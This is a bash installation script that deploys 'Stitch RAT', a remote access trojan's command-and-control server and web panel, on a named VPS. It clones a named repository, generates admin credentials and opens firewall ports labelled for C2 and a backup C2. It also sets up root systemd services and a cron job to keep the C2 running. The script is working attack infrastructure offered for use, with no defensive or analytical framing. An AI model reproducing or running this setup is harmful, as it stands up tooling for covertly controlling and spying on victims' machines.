#!/bin/bash
#############################################################
# STITCH RAT - EASIEST UBUNTU INSTALLATION SCRIPT
# Specifically optimized for IONOS Ubuntu 24.04 VPS
# Host: 50.21.187.77 | RAM: 1GB | Storage: 10GB
#############################################################

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
INSTALL_DIR="/opt/stitch_rat"
SERVICE_NAME="stitch-rat"
WEB_SERVICE="stitch-web"
LOG_FILE="/var/log/stitch_install.log"

# Logging function
log() {
    echo -e "${GREEN}[+]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> $LOG_FILE
}

error() {
    echo -e "${RED}[!]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1" >> $LOG_FILE
    exit 1
}

warning() {
    echo -e "${YELLOW}[!]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] WARNING: $1" >> $LOG_FILE
}

info() {
    echo -e "${BLUE}[i]${NC} $1"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root! Use: sudo bash install.sh"
    fi
}

# System information
show_system_info() {
    info "=== IONOS VPS System Information ==="
    info "OS: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
    info "Kernel: $(uname -r)"
    info "CPU: $(nproc) vCore(s)"
    info "RAM: $(free -h | awk '/^Mem:/ {print $2}')"
    info "Disk: $(df -h / | awk 'NR==2 {print $2}')"
    info "IP: $(curl -s ifconfig.me 2>/dev/null || echo 'Unable to detect')"
    echo ""
}

# Update system packages
update_system() {
    log "Updating system packages..."
    export DEBIAN_FRONTEND=noninteractive
    
    apt-get update -qq > /dev/null 2>&1
    apt-get upgrade -y -qq > /dev/null 2>&1
    
    log "System updated successfully"
}

# Install dependencies
install_dependencies() {
    log "Installing system dependencies..."
    
    apt-get install -y -qq \
        python3 \
        python3-pip \
        python3-venv \
        python3-dev \
        build-essential \
        libssl-dev \
        libffi-dev \
        git \
        curl \
        wget \
        unzip \
        openssl \
        sqlite3 \
        libsqlite3-dev \
        ufw \
        screen \
        htop \
        net-tools \
        > /dev/null 2>&1
    
    log "Dependencies installed successfully"
}

# Setup installation directory
setup_directory() {
    log "Setting up installation directory..."
    
    # Remove existing installation if present
    if [ -d "$INSTALL_DIR" ]; then
        warning "Existing installation found, backing up..."
        mv "$INSTALL_DIR" "${INSTALL_DIR}.backup.$(date +%Y%m%d_%H%M%S)"
    fi
    
    mkdir -p "$INSTALL_DIR"
    cd "$INSTALL_DIR"
    
    log "Installation directory ready: $INSTALL_DIR"
}

# Clone repository
clone_repository() {
    log "Cloning Stitch RAT repository..."
    
    # Clone the repository
    git clone https://github.com/oranolio956/flipperflipper.git . > /dev/null 2>&1
    
    # Verify critical files exist
    if [ ! -f "main.py" ] && [ ! -f "web_app_real.py" ]; then
        error "Repository clone failed or missing critical files"
    fi
    
    log "Repository cloned successfully"
}

# Setup Python environment
setup_python_env() {
    log "Setting up Python virtual environment..."
    
    # Create virtual environment
    python3 -m venv venv
    
    # Activate virtual environment
    source venv/bin/activate
    
    # Upgrade pip
    pip install --upgrade pip > /dev/null 2>&1
    
    # Install requirements
    if [ -f "requirements.txt" ]; then
        pip install -r requirements.txt > /dev/null 2>&1
    fi
    
    # Install additional dependencies for Ubuntu compatibility
    pip install -q \
        flask>=2.3.0 \
        flask-socketio>=5.3.0 \
        flask-cors>=4.0.0 \
        flask-limiter>=3.5.0 \
        flask-wtf>=1.1.0 \
        cryptography>=41.0.0 \
        pyyaml>=6.0 \
        pyjwt>=2.8.0 \
        pillow>=10.0.0 \
        dnspython>=2.4.0 \
        psutil>=5.9.0 \
        requests>=2.31.0 \
        python-engineio>=4.5.0 \
        python-socketio>=5.9.0 \
        python-dotenv>=1.0.0 \
        colorama>=0.4.6 \
        werkzeug>=2.3.0 \
        > /dev/null 2>&1
    
    log "Python environment configured successfully"
}

# Generate SSL certificates
generate_certificates() {
    log "Generating SSL certificates..."
    
    mkdir -p certs
    
    if [ ! -f "certs/cert.pem" ]; then
        # Get public IP for certificate
        PUBLIC_IP=$(curl -s ifconfig.me 2>/dev/null || echo "localhost")
        
        openssl req -x509 -newkey rsa:4096 -nodes \
            -out certs/cert.pem \
            -keyout certs/key.pem \
            -days 365 \
            -subj "/C=US/ST=State/L=City/O=Stitch RAT/CN=${PUBLIC_IP}" \
            > /dev/null 2>&1
        
        chmod 600 certs/key.pem
        chmod 644 certs/cert.pem
        
        log "SSL certificates generated for IP: $PUBLIC_IP"
    else
        log "SSL certificates already exist"
    fi
}

# Create configuration
create_configuration() {
    log "Creating configuration files..."
    
    # Generate secure passwords
    ADMIN_PASSWORD=$(openssl rand -base64 12 | tr -d "=+/" | cut -c1-12)
    SECRET_KEY=$(openssl rand -hex 32)
    
    # Create .env file
    cat > .env << EOF
# Stitch RAT Configuration for IONOS VPS
STITCH_ADMIN_USER=admin
STITCH_ADMIN_PASSWORD=${ADMIN_PASSWORD}
STITCH_SECRET_KEY=${SECRET_KEY}
STITCH_HOST=0.0.0.0
STITCH_PORT=5000
STITCH_SERVER_PORT=4040
STITCH_ENABLE_HTTPS=true
STITCH_SSL_CERT=certs/cert.pem
STITCH_SSL_KEY=certs/key.pem
STITCH_LOG_LEVEL=INFO
STITCH_MAX_CONNECTIONS=50
STITCH_DEBUG=false
EOF
    
    chmod 600 .env
    
    # Save credentials for user
    cat > /root/stitch_credentials.txt << EOF
=== STITCH RAT ACCESS CREDENTIALS ===
Web Interface: https://$(curl -s ifconfig.me):5000
Username: admin
Password: ${ADMIN_PASSWORD}
C2 Server: $(curl -s ifconfig.me):4040

IMPORTANT: Save these credentials securely!
EOF
    
    chmod 600 /root/stitch_credentials.txt
    
    log "Configuration created - credentials saved to /root/stitch_credentials.txt"
}

# Configure firewall
configure_firewall() {
    log "Configuring UFW firewall..."
    
    # Reset firewall to defaults
    ufw --force reset > /dev/null 2>&1
    
    # Set default policies
    ufw default deny incoming > /dev/null 2>&1
    ufw default allow outgoing > /dev/null 2>&1
    
    # Allow SSH (current session)
    ufw allow 22/tcp comment 'SSH' > /dev/null 2>&1
    
    # Allow Stitch RAT ports
    ufw allow 5000/tcp comment 'Stitch Web Interface' > /dev/null 2>&1
    ufw allow 4040/tcp comment 'Stitch C2 Server' > /dev/null 2>&1
    ufw allow 5555/tcp comment 'Stitch Backup C2' > /dev/null 2>&1
    
    # Enable firewall
    ufw --force enable > /dev/null 2>&1
    
    log "Firewall configured successfully"
}

# Create systemd services
create_services() {
    log "Creating systemd services..."
    
    # Main C2 server service
    cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=Stitch RAT C2 Server
After=network.target
Wants=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=${INSTALL_DIR}
Environment=PATH=${INSTALL_DIR}/venv/bin
EnvironmentFile=${INSTALL_DIR}/.env
ExecStart=${INSTALL_DIR}/venv/bin/python ${INSTALL_DIR}/main.py
Restart=always
RestartSec=10
StandardOutput=append:/var/log/stitch-c2.log
StandardError=append:/var/log/stitch-c2-error.log
KillMode=mixed
TimeoutStopSec=30

[Install]
WantedBy=multi-user.target
EOF

    # Web interface service
    cat > /etc/systemd/system/${WEB_SERVICE}.service << EOF
[Unit]
Description=Stitch RAT Web Interface
After=network.target ${SERVICE_NAME}.service
Wants=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=${INSTALL_DIR}
Environment=PATH=${INSTALL_DIR}/venv/bin
EnvironmentFile=${INSTALL_DIR}/.env
ExecStart=${INSTALL_DIR}/venv/bin/python ${INSTALL_DIR}/web_app_real.py
Restart=always
RestartSec=10
StandardOutput=append:/var/log/stitch-web.log
StandardError=append:/var/log/stitch-web-error.log

[Install]
WantedBy=multi-user.target
EOF
    
    # Reload systemd
    systemctl daemon-reload
    
    # Enable services
    systemctl enable ${SERVICE_NAME} > /dev/null 2>&1
    systemctl enable ${WEB_SERVICE} > /dev/null 2>&1
    
    log "Systemd services created and enabled"
}

# Start services
start_services() {
    log "Starting Stitch RAT services..."
    
    # Start C2 server
    systemctl start ${SERVICE_NAME}
    sleep 3
    
    # Start web interface
    systemctl start ${WEB_SERVICE}
    sleep 3
    
    # Check service status
    if systemctl is-active --quiet ${SERVICE_NAME}; then
        log "C2 Server started successfully"
    else
        error "C2 Server failed to start - check logs: journalctl -u ${SERVICE_NAME}"
    fi
    
    if systemctl is-active --quiet ${WEB_SERVICE}; then
        log "Web Interface started successfully"
    else
        warning "Web Interface may have issues - check logs: journalctl -u ${WEB_SERVICE}"
    fi
}

# Create monitoring script
create_monitoring() {
    log "Setting up monitoring and maintenance..."
    
    # Health check script
    cat > ${INSTALL_DIR}/health_check.sh << 'EOF'
#!/bin/bash
echo "=== Stitch RAT Health Check - $(date) ==="
echo ""

# Service status
echo "Service Status:"
systemctl is-active stitch-rat && echo "✓ C2 Server: Running" || echo "✗ C2 Server: Stopped"
systemctl is-active stitch-web && echo "✓ Web Interface: Running" || echo "✗ Web Interface: Stopped"
echo ""

# Port status
echo "Port Status:"
netstat -tuln | grep :4040 > /dev/null && echo "✓ C2 Port 4040: Open" || echo "✗ C2 Port 4040: Closed"
netstat -tuln | grep :5000 > /dev/null && echo "✓ Web Port 5000: Open" || echo "✗ Web Port 5000: Closed"
echo ""

# Resource usage
echo "Resource Usage:"
echo "CPU: $(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)%"
echo "RAM: $(free | grep Mem | awk '{printf("%.1f%%", $3/$2 * 100.0)}')"
echo "Disk: $(df -h / | awk 'NR==2 {print $5}')"
echo ""

# Recent errors
echo "Recent Errors (last 5):"
tail -n 5 /var/log/stitch-*-error.log 2>/dev/null | grep -v "^$" || echo "No recent errors"
EOF
    
    chmod +x ${INSTALL_DIR}/health_check.sh
    
    # Auto-restart script
    cat > ${INSTALL_DIR}/auto_restart.sh << 'EOF'
#!/bin/bash
# Auto-restart failed services

if ! systemctl is-active --quiet stitch-rat; then
    echo "[$(date)] Restarting C2 Server..." >> /var/log/stitch-auto-restart.log
    systemctl restart stitch-rat
fi

if ! systemctl is-active --quiet stitch-web; then
    echo "[$(date)] Restarting Web Interface..." >> /var/log/stitch-auto-restart.log
    systemctl restart stitch-web
fi
EOF
    
    chmod +x ${INSTALL_DIR}/auto_restart.sh
    
    # Add cron job for auto-restart (every 5 minutes)
    (crontab -l 2>/dev/null; echo "*/5 * * * * ${INSTALL_DIR}/auto_restart.sh") | crontab -
    
    log "Monitoring and auto-restart configured"
}

# Display final information
show_completion_info() {
    PUBLIC_IP=$(curl -s ifconfig.me 2>/dev/null || echo "YOUR_VPS_IP")
    
    echo ""
    echo "=================================================================="
    echo -e "${GREEN}🚀 STITCH RAT INSTALLATION COMPLETE! 🚀${NC}"
    echo "=================================================================="
    echo ""
    echo -e "${YELLOW}📡 Access Information:${NC}"
    echo -e "   Web Interface: ${GREEN}https://${PUBLIC_IP}:5000${NC}"
    echo -e "   C2 Server: ${GREEN}${PUBLIC_IP}:4040${NC}"
    echo ""
    echo -e "${YELLOW}🔐 Login Credentials:${NC}"
    cat /root/stitch_credentials.txt | grep -E "(Username|Password):"
    echo ""
    echo -e "${YELLOW}🛠️ Management Commands:${NC}"
    echo -e "   Status: ${BLUE}systemctl status stitch-rat stitch-web${NC}"
    echo -e "   Logs: ${BLUE}journalctl -u stitch-rat -f${NC}"
    echo -e "   Restart: ${BLUE}systemctl restart stitch-rat stitch-web${NC}"
    echo -e "   Health: ${BLUE}${INSTALL_DIR}/health_check.sh${NC}"
    echo ""
    echo -e "${YELLOW}📁 Important Files:${NC}"
    echo -e "   Credentials: ${BLUE}/root/stitch_credentials.txt${NC}"
    echo -e "   Configuration: ${BLUE}${INSTALL_DIR}/.env${NC}"
    echo -e "   Logs: ${BLUE}/var/log/stitch-*.log${NC}"
    echo ""
    echo -e "${GREEN}✅ Your Stitch RAT is now operational and ready to use!${NC}"
    echo "=================================================================="
}

# Main installation function
main() {
    echo ""
    echo "=================================================================="
    echo -e "${GREEN}🔥 STITCH RAT - EASIEST UBUNTU INSTALLATION 🔥${NC}"
    echo -e "${BLUE}   Optimized for IONOS Ubuntu 24.04 VPS${NC}"
    echo "=================================================================="
    echo ""
    
    check_root
    show_system_info
    update_system
    install_dependencies
    setup_directory
    clone_repository
    setup_python_env
    generate_certificates
    create_configuration
    configure_firewall
    create_services
    start_services
    create_monitoring
    show_completion_info
    
    log "Installation completed successfully!"
}

# Run main installation
main "$@"